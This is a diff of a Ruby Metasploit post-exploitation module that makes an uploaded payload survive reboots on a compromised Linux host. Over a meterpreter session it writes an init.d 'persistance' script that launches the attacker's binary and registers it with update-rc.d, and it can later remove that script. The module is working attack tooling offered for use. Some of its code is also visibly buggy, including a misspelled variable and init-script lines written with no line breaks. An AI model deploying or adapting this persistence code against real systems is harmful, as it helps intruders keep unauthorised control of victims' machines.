@@ -22,10 +22,10 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on        => set SESSION 3
-# The full path of binay to be executed (remote)  => set REMOTE_PATH /root/payload
-# The full path to init.d directory     (remote)  => set INIT_PATH /etc/init.d
-# Delete persistence script/configurations        => set DEL_PERSISTENCE true
+# The session number to run this module on           => set SESSION 3
+# The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
+# The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
+# Delete persistence script/configurations           => set DEL_PERSISTENCE true
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -56,9 +56,9 @@
 
 
 
-# ----------------------------
+#
 # Module Dependencies/requires
-# ----------------------------
+#
 require 'rex'
 require 'msf/core'
 require 'msf/core/post/common'
@@ -66,11 +66,11 @@ require 'msf/core/post/common'
 
 
 
-# ----------------------------------
+#
 # Metasploit Class name and includes
-# ----------------------------------
+#
 class MetasploitModule < Msf::Post
-      Rank = ExcellentRanking
+      Rank = GreatRanking
 
   include Msf::Post::File
   include Msf::Post::Linux::Priv
@@ -83,9 +83,9 @@ class MetasploitModule < Msf::Post
 # -----------------------------------------
         def initialize(info={})
                 super(update_info(info,
-                        'Name'          => 'Linux Kali 2.0 init.d persistence post-module',
+                        'Name'          => 'Linux Kali init.d persistence post-module',
                         'Description'   => %q{
-                                        Builds 'persistance' init.d startup script that allow users to persiste your elf binary (linux executables) on Linux Kali 2.0 distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges active (in non-Kali distros).
+                                        Builds 'persistance' init.d startup script that allow users to persiste your elf binary (linux executables) on Linux Kali distros at every startup. This post-exploitation module requires the payload allready deployed in target system and root privileges active (in non-Kali distros).
                         },
                         'License'       => UNKNOWN_LICENSE,
                         'Author'        =>
@@ -93,22 +93,21 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
+                        'Version'        => '$Revision: 1.2',
                         'DisclosureDate' => 'mai 31 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
-                        'Privileged'     => 'false',   # thats no need for privilege escalation (kali) ..
+                        'Privileged'     => 'false',   # thats no need for privilege escalation (in-kali) ..
                         'Targets'        =>
                                 [
-                                         [ 'Linux Kali' ]
+                                         [ 'Linux' ]
                                 ],
                         'DefaultTarget'  => '1', # default its to run againts Kali 2.0
                         'References'     =>
                                 [
-                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                          [ 'URL', 'https://github.com/r00t-3xp10it' ],
-                                         [ 'URL', 'http://x42.obscurechannel.com/?p=368' ],
-                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]
+                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
+                                         [ 'URL', 'https://unix.stackexchange.com/questions/326921/run-two-scripts-with-init-d' ]
 
 
                                 ],
@@ -124,12 +123,12 @@ class MetasploitModule < Msf::Post
                 register_options(
                         [
                                 OptString.new('SESSION', [ true, 'The session number to run this module on']),
-                                OptString.new('REMOTE_PATH', [ false, 'The full path of binay to be executed (eg /root/payload)'])
+                                OptString.new('REMOTE_PATH', [ false, 'The full remote path of binary to execute (eg /root/payload)'])
                         ], self.class)
 
                 register_advanced_options(
                         [
-                                OptString.new('INIT_PATH', [ false, 'The full path to init.d directory (eg /etc/init.d)']),
+                                OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                         ], self.class) 
 
@@ -143,6 +142,7 @@ class MetasploitModule < Msf::Post
 def ls_stage1
 
   session = client
+  os = session.sys.config.sysinfo
   init_check = datastore['INIT_PATH']        # /etc/init.d
   remote_path = datastore['REMOTE_PATH']     # /root/payload
   script_check = "#{init_check}/persistance" # /etc/init.d/persistance
@@ -155,7 +155,7 @@ def ls_stage1
     vprint_warning("Please set REMOTE_PATH option!")
     return nil
   else
-    vprint_status("Persist: #{remote_path} agent ..")
+    vprint_status("Persist #{remote_path} agent ..")
     Rex::sleep(1.0)
   end
 
@@ -167,20 +167,23 @@ def ls_stage1
       vprint_error("Please upload your agent before running this module ..")
       return nil
     end
+    vprint_status("Remote agent full path found ..")
     #
     # Check init.d directory existance (remote)..
     #
     if not session.fs.directory.exist?(init_check)
       vprint_error("%red" + "path: #{init_check} not found ..")
+      vprint_error("Please set a diferent path in 'INIT_PATH' option ..")
       return nil
     end
+    vprint_status("Remote service directory found ..")
 
       #
       # This is the init.d script that provides persistence on startup ..
       #
-      vprint_warning("writing init.d startup script ..")
+      vprint_warning("Writing init.d persistence startup script ..")
       Rex::sleep(1.0)
-      vprint_good("remote path: #{init_check}/persistance")
+      vprint_good("Service path: #{init_check}/persistance")
       File.open("#{init_check}/persistance", "w+") do |f|
         f.write("#!/bin/sh")
         f.write("### BEGIN INIT INFO")
@@ -197,6 +200,7 @@ def ls_stage1
         f.write("sleep 5 > /dev/null")
         f.write("./#{remote_path}")
       end
+
       #
       # Config init.d startup service (chmod + update-rc.d)
       #
@@ -204,7 +208,7 @@ def ls_stage1
         vprint_good("Config init.d persistence script ..")
         Rex::sleep(1.0)
         cmd_exec("chmod +x #{script_check}")
-        vprint_good("Update init.d service status ..")
+        vprint_good("Update init.d service status (symlinks)..")
         Rex::sleep(1.0)
         cmd_exec("update-rc.d persistance defaults # 97 03")
       else
@@ -215,11 +219,9 @@ def ls_stage1
     #
     # Final displays to user ..
     #
-    vprint_good("persistence activated on remote system ..")
-    vprint_status("agent to exec: #{remote_path}")
-    vprint_status("init.d script: #{script_check}")
-    vprint_line("")
+    vprint_status("Persistence activated on: #{os['Computer']}")
     Rex::sleep(1.0)
+    vprint_line("")
 
   #
   # error exception funtion
@@ -238,6 +240,7 @@ end
 def ls_stage2
 
   session = client
+  os = session.sys.config.sysinfo
   init_check = datastore['INIT_PATH']        # /etc/init.d
   script_check = "#{init_check}/persistance" # /etc/init.d/persistance
   #
@@ -260,17 +263,17 @@ def ls_stage2
       vprint_error("%red" + "script: #{script_check} not found ..")
       return nil
     end
+    vprint_status("Persistence script full path found ..")
 
       #
       # Delete init.d script ..
       #
-      vprint_status("remove script from init.d directory ..")
+      vprint_status("Remove script from init.d directory ..")
       Rex::sleep(1.0)
       cmd_exec("rm -f #{init_check}/persistance")
       vprint_status("Delete persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
       Rex::sleep(1.5)
-
 
     #
     # Check init.d persiste script existance ..
@@ -282,6 +285,13 @@ def ls_stage2
       return nil
     end
 
+    #
+    # Final displays to user ..
+    #
+    vprint_status("Persistence deleted from: #{os['Computer']}")
+    vprint_warning("This module will NOT delete the binary from target ..")
+    Rex::sleep(1.0)
+    vprint_line("")
 
   #
   # error exception funtion
@@ -308,7 +318,6 @@ def run
       runsession = client.session_host
       directory = client.fs.dir.pwd
 
-
     # Print banner and scan results on screen
     print_line("    +---------------------------------------------+")
     print_line("    |  Kali Linux init.d persistence post-module  |")
@@ -332,14 +341,14 @@ def run
     # check for proper operative system (Linux Kali)
     # if not distro =~ /Kali/
     if not sysinfo['OS'] =~ /Linux/
-      vprint_error("[ ABORT ]: This module only works againt Linux systems")
+      vprint_error("%red" + "[ ABORT ]: This module only works againt Linux systems")
       return nil
     end
     #
     # Check if we are running in an higth integrity context ..
     #
     unless is_root?
-      vprint_error("[ ABORT ]: Root access is required ..")
+      vprint_error("%red" + "[ ABORT ]: Root access is required ..")
       return nil
     end
     #
@@ -349,7 +358,7 @@ def run
     if not sysinfo.nil?
       vprint_status("Running module against: #{sysnfo['Computer']}")
     else
-      vprint_error("[ ABORT ]: This module only works against meterpreter sessions!")
+      vprint_error("%red" + "[ ABORT ]: This module only works in meterpreter sessions!")
       return nil
     end
 
